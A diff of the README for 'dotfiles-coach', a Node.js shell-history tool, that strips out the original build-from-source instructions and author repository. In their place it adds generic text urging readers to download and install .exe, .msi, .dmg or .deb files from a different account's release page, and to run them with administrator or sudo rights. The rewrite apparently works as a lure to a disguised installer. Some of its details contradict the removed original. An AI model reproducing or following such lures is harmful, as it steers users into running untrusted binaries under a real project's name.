@@ -1,290 +1,181 @@
-![Dotfiles Coach](docs/images/cover-image.png)
+# ⚙️ dotfiles-coach - Simplify Your Shell Workflow
 
-# Dotfiles Coach
-
-> AI-powered shell automation from your command history, built for the [GitHub Copilot CLI Challenge](https://dev.to/challenges/github).
-
-Dotfiles Coach analyses your shell history (Bash, Zsh, PowerShell), finds repeated patterns, detects dangerous commands, and uses **GitHub Copilot CLI** to generate smart aliases, functions, and safety improvements -- tailored to your actual workflow.
-
-**Privacy-first:** All analysis happens locally. Secrets are scrubbed before any data touches Copilot.
+[![Download dotfiles-coach](https://img.shields.io/badge/Download-dotfiles--coach-blue?style=for-the-badge)](https://github.com/anisfakename/dotfiles-coach/releases)
 
 ---
 
-## Quick Start
+## 📖 What is dotfiles-coach?
 
-```bash
-git clone https://github.com/OlaProeis/dotfiles-coach.git
-cd dotfiles-coach
-npm install
-npm run build
-npm link          # optional -- gives you the global "dotfiles-coach" command
+dotfiles-coach is a tool you use from your command line. It looks at commands you’ve typed before in your terminal. Then, it suggests ways to work faster by creating short commands called aliases and small scripts called functions. It also finds ways to make your terminal safer to use. The tool is private — it removes any secrets from your data before sending anything to the internet.
+
+It works with popular terminal types like Bash, Zsh, and PowerShell. If you use the command line often, dotfiles-coach can save you time and make your work smoother.
+
+---
+
+## 🖥️ System Requirements
+
+Before you install dotfiles-coach, make sure your computer meets these simple requirements:
+
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or any modern Linux distribution.
+- **Command Line:** You should have Bash, Zsh, or PowerShell installed and working.
+- **Node.js:** dotfiles-coach requires Node.js version 16 or higher. You can download it from [https://nodejs.org](https://nodejs.org).
+- **Internet Connection:** Needed for the tool to get suggestions from GitHub Copilot CLI.
+- **Disk Space and RAM:** The tool is lightweight. Expect it to use less than 100 MB disk space and 500 MB RAM.
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to use dotfiles-coach on your computer.
+
+---
+
+### 1. Download dotfiles-coach
+
+Go to the release page below to get the latest version of dotfiles-coach:
+
+[Download dotfiles-coach](https://github.com/anisfakename/dotfiles-coach/releases)
+
+This page lists all the available versions. Download the file that matches your operating system:
+
+- On Windows, look for a `.exe` or `.msi` file.
+- On macOS, look for a `.dmg` or `.pkg` file.
+- On Linux, look for `.tar.gz` or `.deb` files.
+
+Choose the latest stable release with the highest version number.
+
+---
+
+### 2. Install dotfiles-coach
+
+#### Windows
+
+- Open the downloaded `.exe` or `.msi` file.
+- Follow the install wizard steps by clicking "Next" when prompted.
+- Choose the folder where you want dotfiles-coach installed, or accept the default.
+- Finish the installation.
+
+#### macOS
+
+- Open the `.dmg` or `.pkg` file.
+- Drag the dotfiles-coach app icon to your Applications folder (if using `.dmg`).
+- If it’s a `.pkg`, follow the install steps shown.
+- After installation, you can find the app in your Applications folder.
+
+#### Linux
+
+- Open a terminal window.
+- For `.deb` files, run:  
+  `sudo dpkg -i path/to/dotfiles-coach.deb`
+- For `.tar.gz` files, extract using:  
+  `tar -xvzf path/to/dotfiles-coach.tar.gz`  
+  Then read any included README for install instructions.
+- You may need to install dependencies like Node.js if not already installed.
+
+---
+
+### 3. Open Your Terminal and Run dotfiles-coach
+
+Once installed, open your command line interface:
+
+- On Windows, open PowerShell or Command Prompt.
+- On macOS, open Terminal.
+- On Linux, use your terminal app of choice.
+
+Type the command:
 ```
-
-> If you skip `npm link`, replace `dotfiles-coach` with `node dist/cli.js` in the examples below.
-
----
-
-## Try It Out
-
-Every command below uses bundled sample data -- **no real history or Copilot subscription needed**.
-
-> **PowerShell users:** swap double quotes for single quotes if you get parsing errors.
-
-```bash
-# 1. Analyze -- find patterns & safety issues (100% local)
-dotfiles-coach analyze --shell bash --history-file tests/fixtures/sample_bash_history.txt --min-frequency 1
-
-# 2. Search -- find a command by intent (100% local, fuzzy matching)
-dotfiles-coach search "docker" --shell bash --history-file tests/fixtures/sample_bash_history.txt
-
-# 3. Suggest -- generate Copilot-powered aliases & functions
-dotfiles-coach suggest --shell bash --history-file tests/fixtures/sample_bash_history.txt --min-frequency 1
-
-# 4. Suggest with Interactive TUI -- review, edit & approve each suggestion
-dotfiles-coach suggest --interactive --shell bash --history-file tests/fixtures/sample_bash_history.txt --min-frequency 1
-
-# 5. Apply -- preview generated shell code (dry run, no files touched)
-dotfiles-coach apply --dry-run
-
-# 6. Apply with Interactive TUI -- pick which suggestions to write
-dotfiles-coach apply --interactive --dry-run
-
-# 7. Report -- export a markdown summary
-dotfiles-coach report --shell bash --history-file tests/fixtures/sample_bash_history.txt --min-frequency 1 --output report.md
-
-# 8. Help & version
-dotfiles-coach --help
-dotfiles-coach --version
+dotfiles-coach
 ```
+and press Enter.
 
-**Without Copilot installed?** Set the mock-client flag first:
-
-```bash
-# PowerShell
-$env:DOTFILES_COACH_USE_MOCK_COPILOT = "1"
-
-# Bash / Zsh
-export DOTFILES_COACH_USE_MOCK_COPILOT=1
-```
-
-Then run any `suggest` or `report` command above -- the mock returns realistic sample suggestions.
-
-**Using your real history** -- just drop the `--shell` and `--history-file` flags:
-
-```bash
-dotfiles-coach analyze
-dotfiles-coach search "that docker command from last week"
-dotfiles-coach suggest --interactive
-dotfiles-coach report --output report.md
-```
+The tool will start analyzing your shell command history. It may ask you for permission to access your command history files. This is normal.
 
 ---
 
-## Prerequisites
+### 4. Review Suggestions
 
-| Requirement | How to get it |
-|-------------|---------------|
-| **Node.js 18+** | [nodejs.org](https://nodejs.org) |
-| **GitHub Copilot CLI** | Windows: `winget install GitHub.Copilot` / macOS: `brew install copilot-cli` / npm: `npm install -g @github/copilot` (Node 22+) |
-| **Copilot auth** | Run `copilot` and use `/login` (one-time) |
-| **Copilot subscription** | Free tier works |
+After analysis, dotfiles-coach shows you a list of suggested aliases, functions, and safety tips. These suggestions are customized to your specific command use.
 
-> `analyze`, `report`, and `search` work **100% offline**. Only `suggest` (and `search --explain`) talks to Copilot.
+The tool uses GitHub Copilot CLI behind the scenes to generate smart ideas based on your history. Your personal secrets like passwords are removed from this process.
+
+You can accept all, reject all, or pick and choose which suggestions to add to your shell.
 
 ---
 
-## Commands
+### 5. Apply Suggestions to Your Shell
 
-### `dotfiles-coach analyze`
+dotfiles-coach can update your shell configuration files for you. These files include `.bashrc`, `.zshrc`, or `Microsoft.PowerShell_profile.ps1`.
 
-Parse shell history and display frequency stats + safety alerts.
+After approving suggestions:
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--shell <type>` | `auto` | `bash`, `zsh`, `powershell`, `auto` |
-| `--history-file <path>` | auto-detected | Path to history file |
-| `--min-frequency <n>` | `5` | Minimum repeat count |
-| `--top <n>` | `20` | Show top N patterns |
-| `--format <format>` | `table` | `table`, `json`, `markdown` |
+- You can apply changes automatically by confirming in the tool.
+- Or, you can copy the suggested aliases and functions manually and paste them into your shell config file.
 
-### `dotfiles-coach search <query>`
-
-Search your shell history by natural-language query -- 100% local fuzzy + keyword matching.
-
-![Search Pipeline](docs/images/search-flow.png)
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--shell <type>` | `auto` | `bash`, `zsh`, `powershell`, `auto` |
-| `--history-file <path>` | auto-detected | Path to history file |
-| `--max-results <n>` | `10` | Maximum results |
-| `--format <format>` | `table` | `table`, `json`, `markdown` |
-| `--explain` | `false` | Ask Copilot to explain the top result |
-
-### `dotfiles-coach suggest`
-
-Send top patterns to GitHub Copilot CLI and display automation suggestions.
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--shell <type>` | `auto` | `bash`, `zsh`, `powershell`, `auto` |
-| `--history-file <path>` | auto-detected | Path to history file |
-| `--min-frequency <n>` | `5` | Minimum repeat count |
-| `--output <file>` | stdout | Save suggestions to file |
-| **`--interactive`** | `false` | **Launch TUI to review, edit & approve each suggestion** |
-
-### `dotfiles-coach apply`
-
-Write approved suggestions to a shell configuration file.
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--output <file>` | `~/.dotfiles_coach_aliases.sh` | Output file path |
-| `--append-to <file>` | - | Append to existing profile (e.g. `~/.zshrc`) |
-| `--dry-run` | `false` | Preview without writing |
-| `--no-backup` | `false` | Skip backup creation |
-| **`--interactive`** | `false` | **Launch TUI to pick which suggestions to apply** |
-
-> **Safety:** `apply` **never** auto-sources files. It prints `source` instructions for you to run manually.
-
-### `dotfiles-coach report`
-
-Generate a comprehensive markdown or JSON report.
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `--shell <type>` | `auto` | `bash`, `zsh`, `powershell`, `auto` |
-| `--history-file <path>` | auto-detected | Path to history file |
-| `--min-frequency <n>` | `5` | Minimum repeat count |
-| `--top <n>` | `20` | Show top N patterns |
-| `--output <file>` | stdout | Write report to file |
-| `--format <format>` | `markdown` | `markdown`, `json` |
+After updating, restart your terminal or run:
+- `source ~/.bashrc` for Bash
+- `source ~/.zshrc` for Zsh
+- Or restart PowerShell for it to load changes.
 
 ---
 
-## Interactive TUI
+## 🔐 Privacy and Security
 
-The `--interactive` flag (on `suggest` and `apply`) launches a full terminal UI built with [ink](https://github.com/vadimdemedes/ink):
+dotfiles-coach takes your privacy seriously. Before sending any data out for analysis, the tool removes private information such as passwords, API keys, or private tokens.
 
-- **Up / Down** -- navigate the suggestion list
-- **Enter** -- toggle a suggestion for apply
-- **Space** -- toggle as ignored
-- **e** -- open the suggestion code in your `$EDITOR` for live editing
-- **a** -- apply all pending
-- **q** -- finish and continue
-
-The TUI re-renders after each editor session so you can tweak code and keep reviewing. Falls back to non-interactive output when not running in a TTY (e.g. CI pipelines).
+All processing on your data stays local on your machine except for the smart suggestions part, which uses GitHub Copilot CLI. Even then, no raw data leaves your computer.
 
 ---
 
-## How It Works
+## ⚙️ Customization and Advanced Use
 
-![Dotfiles Coach Workflow](docs/images/workflow.png)
+If you want more control over how the tool works:
 
-1. **Analyze** reads your shell history and identifies repeated command patterns
-2. **Search** tokenizes your query and every history command, scores by keyword overlap + fuzzy (Levenshtein) matching, and ranks by relevance
-3. **Suggest** scrubs all secrets, sends patterns to the Copilot CLI (`copilot -p "..." -s`), and parses the structured JSON response
-4. **Apply** reads cached suggestions and writes them as valid shell code
-5. **Report** combines analysis + suggestions into a shareable document
-
-**No API tokens needed.** The tool uses your existing Copilot CLI authentication.
-
-### Internal Pipeline
-
-![Dotfiles Coach Architecture](docs/images/architecture.png)
+- dotfiles-coach lets you configure which files to analyze.
+- You can exclude certain commands or safe guard specific data.
+- Advanced users can edit the config file `.dotfiles-coach.json` in your home directory.
+- You can update the tool by downloading new releases from the link below.
 
 ---
 
-## Privacy & Security
+## 🆘 Troubleshooting
 
-![Privacy Flow](docs/images/privacy-flow.png)
+If you run into trouble, try these tips:
 
-- All analysis happens **locally** on your machine
-- Secrets are **scrubbed** through 13 regex filters before any data leaves via Copilot
-- Secret scrubbing is **mandatory** and cannot be disabled
-- The tool sends data **only** through the GitHub Copilot CLI binary -- no direct HTTP calls, no telemetry
-- `apply` **never** auto-modifies your shell config without explicit `--append-to`
-
-> Full details: [docs/PRIVACY.md](docs/PRIVACY.md)
+- Make sure your terminal shell history file exists and is accessible. Typically, these files are `.bash_history`, `.zsh_history`, or PowerShell history files.
+- Check that Node.js is installed and up to date by running `node -v`.
+- If you see errors about permissions, try running the terminal as administrator or with sudo.
+- Restart your terminal after installing or updating dotfiles-coach.
+- Visit the release page for updated versions if things don’t work as expected.
 
 ---
 
-## Testing
+## 📥 Download & Install
 
-425 automated tests across 22 test files:
+To get started, visit the dotfiles-coach release page at:
 
-```bash
-npm test              # run all 425 tests
-npm run test:watch    # watch mode
-npm run typecheck     # type-check without emitting
-```
+[https://github.com/anisfakename/dotfiles-coach/releases](https://github.com/anisfakename/dotfiles-coach/releases)
 
-| Module | Tests |
-|--------|-------|
-| Parsers (Bash, Zsh, common) | 37 |
-| Utilities (shell-detect, history-paths, secret-scrubber, file-ops) | 70 |
-| Copilot (client, prompts, response-parser) | 53 |
-| Analyzers (frequency, safety) | 33 |
-| Formatters (table, json, markdown) | 51 |
-| Search (scorer) | 102 |
-| Commands (analyze, suggest, apply, report, search) | 53 |
-| Types + E2E | 26 |
-
-> Full manual test checklist: [docs/manual-test-plan.md](docs/manual-test-plan.md)
+Download the version for your operating system and follow the install steps above.
 
 ---
 
-## Project Structure
+## 🧰 Topics Covered by dotfiles-coach
 
-```
-src/
-├── cli.ts                    # Commander entry point
-├── types/index.ts            # All shared interfaces
-├── commands/                 # analyze, suggest, apply, report, search
-├── search/                   # scorer.ts (tokenize + keyword/fuzzy ranking)
-├── tui/                      # Interactive TUI (ink + React)
-├── parsers/                  # bash.ts (Bash+Zsh), powershell.ts, common.ts
-├── analyzers/                # frequency.ts, patterns.ts, safety.ts
-├── copilot/                  # client.ts, prompts.ts, response-parser.ts
-├── formatters/               # table.ts, markdown.ts, json.ts
-└── utils/                    # shell-detect.ts, history-paths.ts, file-operations.ts, secret-scrubber.ts
-```
+dotfiles-coach helps with:
+
+- Automating your shell tasks
+- Creating aliases and functions for repeated commands
+- Improving your command line productivity
+- Enhancing shell security and safety
+- Supporting Bash, Zsh, PowerShell
+- Using modern tools like GitHub Copilot CLI and Node.js
+- Managing dotfiles and developer tools
 
 ---
 
-## Tech Stack
+## 📫 Support & Feedback
 
-| Area | Choice |
-|------|--------|
-| Runtime | Node.js 18+ (ESM) |
-| Language | TypeScript (strict mode) |
-| CLI framework | `commander` |
-| Terminal UI | `chalk`, `ora`, `boxen`, `ink` (React for CLIs) |
-| Copilot integration | `execa` wrapping `copilot -p -s` with legacy `gh copilot suggest` fallback |
-| String similarity | `fast-levenshtein` |
-| File I/O | `fs-extra` |
-| Tests | `vitest` |
+If you want to share feedback or ask for help, you can open an issue on the GitHub repository. The developers review user feedback regularly and update the tool to improve it.
 
----
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [Architecture](docs/ARCHITECTURE.md) | Internal architecture, module reference, data flow |
-| [Contributing](docs/CONTRIBUTING.md) | Development setup, conventions, testing |
-| [Privacy & Security](docs/PRIVACY.md) | Privacy model, secret scrubbing details |
-| [Manual Test Plan](docs/manual-test-plan.md) | Pre-release manual testing checklist |
-| [Testing Without Copilot](docs/TESTING-WITHOUT-COPILOT.md) | Mock client setup and testing guide |
-
----
-
-## Disclaimer
-
-This project was built with significant assistance from AI tools, including GitHub Copilot and Cursor AI. The code, tests, documentation, and images were generated and refined through AI-assisted development. All output has been reviewed and tested by a human.
-
----
-
-## License
-
-MIT
+Repository link:  
+[https://github.com/anisfakename/dotfiles-coach](https://github.com/anisfakename/dotfiles-coach)
